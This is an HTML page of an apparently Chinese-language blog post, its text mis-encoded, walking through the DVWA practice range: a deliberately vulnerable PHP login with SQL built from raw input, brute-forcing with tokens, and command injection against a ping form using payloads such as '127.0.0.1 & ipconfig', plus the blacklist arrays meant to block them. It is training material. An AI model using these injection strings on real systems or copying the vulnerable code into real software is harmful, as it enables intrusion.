

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
  <link rel="icon" href="/img/avatar.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#473321">
  <meta name="author" content="fan fan">
  <meta name="keywords" content="">
  
    <meta name="description" content="å‰è¨€ ctfæ¯”èµ›ä¸­å†™pwné¢˜ç›®æ—¶å¸¸å¸¸é‡åˆ°æ²¡æœ‰å¤´ç»ªæˆ–è€…å¡å£³çš„æƒ…å†µï¼Œæ‰€ä»¥ä¸ºäº†é¿å…åç‰¢ï¼Œæˆ‘å¼€å¯äº†webå­¦ä¹ ä¹‹è·¯ï¼Œç›®çš„å°±æ˜¯åœ¨æ¯”èµ›ä¸­èƒ½ç»™webå¸ˆå‚…ä»¬æ‰“æ‰“ä¸‹æ‰‹ï¼Œæä¾›ä¸€äº›å¸®åŠ©ï¼Œä¸è‡³äºä»€ä¹ˆä¹Ÿä¸ä¼šã€‚ æ­¤ç¯‡åšå®¢è®°å½•æˆ‘åœ¨DVWAé¶åœºé€šå…³ç»ƒä¹ ã€‚ æš´åŠ›ç ´è§£low12345678910111213141516171819202122232425262728293031323334&lt;?php&#x2F;&#x2F; å¦‚æœæäº¤äº†ç™»å½•è¡¨å•if">
<meta property="og:type" content="article">
<meta property="og:title" content="DVWAå¥‡å¦™ä¹‹æ—…">
<meta property="og:url" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/index.html">
<meta property="og:site_name" content="Pfang1n&#39;s blog">
<meta property="og:description" content="å‰è¨€ ctfæ¯”èµ›ä¸­å†™pwné¢˜ç›®æ—¶å¸¸å¸¸é‡åˆ°æ²¡æœ‰å¤´ç»ªæˆ–è€…å¡å£³çš„æƒ…å†µï¼Œæ‰€ä»¥ä¸ºäº†é¿å…åç‰¢ï¼Œæˆ‘å¼€å¯äº†webå­¦ä¹ ä¹‹è·¯ï¼Œç›®çš„å°±æ˜¯åœ¨æ¯”èµ›ä¸­èƒ½ç»™webå¸ˆå‚…ä»¬æ‰“æ‰“ä¸‹æ‰‹ï¼Œæä¾›ä¸€äº›å¸®åŠ©ï¼Œä¸è‡³äºä»€ä¹ˆä¹Ÿä¸ä¼šã€‚ æ­¤ç¯‡åšå®¢è®°å½•æˆ‘åœ¨DVWAé¶åœºé€šå…³ç»ƒä¹ ã€‚ æš´åŠ›ç ´è§£low12345678910111213141516171819202122232425262728293031323334&lt;?php&#x2F;&#x2F; å¦‚æœæäº¤äº†ç™»å½•è¡¨å•if">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240120190313549.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240121203319474.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240121205203106.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127113836536.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127152301968.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127160327688.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127160433421.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127193015167.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127194623823.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240129215859751.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131162219429.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131162728647.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131162810529.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131163145773.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131163312778.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131163518649.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131164158541.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131164631336.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131164735632.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131165029552.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131195909233.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131200629592.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131200934958.png">
<meta property="og:image" content="http://example.com/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131220939345.png">
<meta property="og:image" content="http://example.com/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131223550962.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240201001905159.png">
<meta property="og:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240201003942089.png">
<meta property="article:published_time" content="2024-01-19T12:27:56.000Z">
<meta property="article:modified_time" content="2024-01-31T16:51:18.283Z">
<meta property="article:author" content="fan fan">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240120190313549.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>DVWAå¥‡å¦™ä¹‹æ—… - Pfang1n&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/mac.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"ğŸ’¡","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"Â§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Pfang1n&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>å‹é“¾</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="DVWAå¥‡å¦™ä¹‹æ—…"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-19 20:27" pubdate>
          2024å¹´1æœˆ19æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          51k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          427 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">DVWAå¥‡å¦™ä¹‹æ—…</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š1 åˆ†é’Ÿå‰
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240120190313549.png" srcset="/img/loading.gif" lazyload alt="image-20240120190313549"></p>
<p>ctfæ¯”èµ›ä¸­å†™pwné¢˜ç›®æ—¶å¸¸å¸¸é‡åˆ°æ²¡æœ‰å¤´ç»ªæˆ–è€…å¡å£³çš„æƒ…å†µï¼Œæ‰€ä»¥ä¸ºäº†é¿å…åç‰¢ï¼Œæˆ‘å¼€å¯äº†webå­¦ä¹ ä¹‹è·¯ï¼Œç›®çš„å°±æ˜¯åœ¨æ¯”èµ›ä¸­èƒ½ç»™webå¸ˆå‚…ä»¬æ‰“æ‰“ä¸‹æ‰‹ï¼Œæä¾›ä¸€äº›å¸®åŠ©ï¼Œä¸è‡³äºä»€ä¹ˆä¹Ÿä¸ä¼šã€‚</p>
<p>æ­¤ç¯‡åšå®¢è®°å½•æˆ‘åœ¨DVWAé¶åœºé€šå…³ç»ƒä¹ ã€‚</p>
<h2 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// å¦‚æœæäº¤äº†ç™»å½•è¡¨å•</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Login&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// è·å–ç”¨æˆ·å</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><br>    <span class="hljs-comment">// è·å–å¯†ç </span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);  <span class="hljs-comment">// å¯¹å¯†ç è¿›è¡Œ MD5 åŠ å¯†</span><br><br>    <span class="hljs-comment">// è¿æ¥æ•°æ®åº“</span><br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>);<br><br>    <span class="hljs-comment">// å¦‚æœæŸ¥è¯¢æˆåŠŸä¸”ç»“æœé›†ä¸­æœ‰ä¸€è¡Œè®°å½•</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// è·å–ç”¨æˆ·è¯¦ç»†ä¿¡æ¯</span><br>        <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>        <span class="hljs-comment">// ç™»å½•æˆåŠŸ</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;æ¬¢è¿è¿›å…¥å¯†ç ä¿æŠ¤åŒºåŸŸ <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// ç™»å½•å¤±è´¥</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;ç”¨æˆ·åå’Œ/æˆ–å¯†ç ä¸æ­£ç¡®ã€‚&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// å…³é—­æ•°æ®åº“è¿æ¥</span><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240121203319474.png" srcset="/img/loading.gif" lazyload alt="image-20240121203319474"></p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>å¢åŠ äº†tokenéªŒè¯ï¼Œè¿™æ ·å°±ä¸‰ä¸ªpayloadï¼Œé€‰æ‹©åŒæ—¶éå†æ”»å‡»</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240121205203106.png" srcset="/img/loading.gif" lazyload alt="image-20240121205203106"></p>
<h2 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>æºç åˆ†æ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<span class="hljs-comment">//ç”¨æˆ·ç‚¹å‡»æäº¤æŒ‰é’®</span><br>    <span class="hljs-comment">// è·å–è¾“å…¥</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// åˆ¤æ–­æ“ä½œç³»ç»Ÿå¹¶æ‰§è¡Œç›¸åº”çš„ ping å‘½ä»¤</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>                 <span class="hljs-comment">//è¿”å›è¿è¡Œ PHP çš„æ“ä½œç³»ç»Ÿçš„åç§°</span><br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Unix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// æ ‡ç­¾åŒ…è£…ï¼Œä¿æŒæ ¼å¼ï¼Œåé¦ˆç»™ç”¨æˆ·</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>stristr(a,b)åœ¨aä¸­å¯»æ‰¾ç¬¬ä¸€æ¬¡å‡ºç°bçš„å¹¶è¿”å›b,ä»¥åŠå…¶åé¢éƒ¨åˆ†ï¼Œä¸åŒºåˆ†å¤§å°å†™</p>
<p>å¯ä»¥æ§åˆ¶targetçš„å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 &amp; ipconfigã€€ã€€ã€€ã€€å…ˆæ‰§è¡Œ127.0.0.1ï¼Œä¸ç®¡127.0.0.1æ˜¯å¦æ‰§è¡ŒæˆåŠŸéƒ½ä¼šæ‰§è¡Œipconfig<br>127.0.0.1 &amp;&amp; ipconfigã€€ã€€  å…ˆæ‰§è¡Œ127.0.0.1ï¼Œ127.0.0.1æ‰§è¡ŒæˆåŠŸåæ‰ä¼šæ‰§è¡Œipconfig<br>127.0.0.1 | ipconfigã€€ã€€ã€€ã€€ä¸ç®¡127.0.0.1æ‰§è¡Œæ˜¯å¦æˆåŠŸéƒ½ä¼šæ‰§è¡Œipconfig<br>127.0.0 || ipconfigã€€ã€€ã€€   å‰é¢çš„å‘½ä»¤è¦æ‰§è¡Œå¤±è´¥ï¼Œæ‰å¯ä»¥æ‰§è¡Œåé¢çš„å‘½ä»¤<br></code></pre></td></tr></table></figure>

<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>åŠ äº†é»‘åå•ï¼Œæºç ä¸­å®šä¹‰äº†ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«è¦æ›¿æ¢çš„å­—ç¬¦åºåˆ—å’Œå®ƒä»¬å¯¹åº”çš„æ›¿æ¢å€¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>       <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>       <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>   );<br><br>   <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br>   <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> ); <br></code></pre></td></tr></table></figure>

<p>array_keysè¿”å›é”®(è¦æ›¿æ¢çš„å­—ç¬¦åºåˆ—)</p>
<p>$substitutionsè¡¨ç¤ºæ›¿æ¢åçš„å€¼</p>
<p>$targetç›®æ ‡å­—ç¬¦ä¸²</p>
<p>æ‰€ä»¥ç›´æ¥æ‰§è¡Œ<strong>127.0.0.1 &amp; ipconfig</strong>å°±å¯ä»¥</p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">//&#x27;|&#x27;+&#x27; &#x27;=&#x27; &#x27;</span><br>        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br><span class="hljs-comment">//æ›¿æ¢æˆç©º</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br></code></pre></td></tr></table></figure>

